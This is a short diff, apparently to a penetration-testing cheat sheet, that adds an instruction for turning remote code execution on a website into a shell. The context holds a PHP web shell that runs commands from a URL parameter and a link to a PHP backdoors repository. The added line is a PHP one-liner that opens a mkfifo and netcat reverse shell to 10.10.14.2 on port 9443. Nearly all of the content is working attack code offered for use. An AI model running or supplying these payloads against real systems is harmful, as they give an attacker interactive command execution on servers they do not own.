@@ -12,6 +12,9 @@ https://raw.githubusercontent.com/F-Masood/php-backdoors/main/rce.php
 
 //<?php echo (shell_exec($_GET['cmd'])); ?>
 
+If you discover you have rce on the website use this command to generate a shell:
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+
 ```
 
 
